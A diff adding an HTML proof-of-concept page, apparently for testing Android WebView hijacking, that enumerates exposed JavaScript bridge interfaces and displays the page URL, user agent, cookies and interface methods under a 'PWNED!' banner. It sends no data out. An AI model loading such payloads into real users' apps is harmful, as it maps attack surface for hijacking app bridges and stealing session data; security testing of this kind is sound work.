@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>WebView Hijacked!</title>
+  </head>
+  <body>
+    loading... JS Required...
+  </body>
+
+  <script>
+(() => {
+
+  const THIS_WINDOW = [...new Set([
+    ...Object.keys(window),
+    ...Object.getOwnPropertyNames(window)
+  ])];
+
+  const DEFAULT_WINDOW = [
+    "window","self","document","location","navigator","console","Object","Array",
+    "Function","String","Number","Boolean","Math","JSON","Promise","eval","alert",
+    "setTimeout","setInterval","clearTimeout","clearInterval"
+  ];
+
+
+  function isLikelyJavascriptInterface(name) {
+    try {
+      if (DEFAULT_WINDOW.includes(name)) return false;
+
+      const v = window[name];
+      if (!v || typeof v !== 'object') return false;
+
+      // Must be a plain object
+      if (Object.prototype.toString.call(v) !== '[object Object]') return false;
+
+      const keys = Object.getOwnPropertyNames(v);
+      if (!keys.length) return false;
+
+ 
+      if (!keys.some(k => typeof v[k] === 'function')) return false;
+
+      // Android interfaces are usually Capitalized
+      if (name[0] !== name[0].toUpperCase()) return false;
+
+      return true;
+    } catch {
+      return false;
+    }
+  }
+
+  const VARS = THIS_WINDOW.filter(isLikelyJavascriptInterface);
+
+  /* ========= UI ========= */
+
+  const GREEN = '#16c1a2';
+  const RED   = '#DD4B21';
+  const BLUE  = '#0EC7F0';
+
+  document.body.replaceChildren();
+  document.body.style.background = '#151519';
+  document.body.style.color = 'white';
+  document.body.style.fontFamily = 'Arial, sans-serif';
+
+  const mainDiv = document.createElement('div');
+  mainDiv.style.padding = '5px';
+  document.body.appendChild(mainDiv);
+
+  function header(text, color = GREEN) {
+    const h = document.createElement('div');
+    h.textContent = text;
+    h.style.background = color;
+    h.style.borderRadius = '10px';
+    h.style.padding = '4px 10px';
+    h.style.margin = '10px 0';
+    h.style.fontWeight = 'bold';
+    return h;
+  }
+
+  function dumpVars(obj, keys) {
+    const wrapper = document.createElement('div');
+    wrapper.style.marginLeft = '10px';
+
+    keys.forEach(k => {
+      const row = document.createElement('div');
+      const key = document.createElement('b');
+      const val = document.createElement('span');
+
+      key.textContent = k;
+      key.style.marginRight = '8px';
+
+      try {
+        if (typeof obj[k] === 'function') {
+          val.textContent = '<function()>';
+          val.style.color = RED;
+        } else {
+          val.textContent = JSON.stringify(obj[k]);
+          val.style.color = '#aaa';
+        }
+      } catch {
+        val.textContent = '[unreadable]';
+      }
+
+      row.appendChild(key);
+      row.appendChild(val);
+      wrapper.appendChild(row);
+    });
+
+    return wrapper;
+  }
+
+  /* ========= Header ========= */
+
+  mainDiv.appendChild(header('PWNED! WebView Hijacked!', RED));
+
+  const info = document.createElement('pre');
+  info.textContent =
+    `location      : ${location.href}\n` +
+    `origin        : ${location.origin}\n` +
+    `userAgent     : ${navigator.userAgent}\n` +
+    `cookie        : ${document.cookie || '(none)'}`;
+  info.style.margin = '10px';
+  mainDiv.appendChild(info);
+
+  /* ========= RESULT ========= */
+
+  if (VARS.length === 0) {
+    mainDiv.appendChild(header('No JavaScript Interfaces Exposed', BLUE));
+  } else {
+    mainDiv.appendChild(
+      header(`Exposed JavaScript Interfaces (${VARS.length})`, GREEN)
+    );
+
+    VARS.forEach(name => {
+      const h = header(`window.${name}`, BLUE);
+      const v = dumpVars(window[name], Object.getOwnPropertyNames(window[name]));
+      mainDiv.appendChild(h);
+      mainDiv.appendChild(v);
+    });
+  }
+
+})();
+  </script>
+</html>
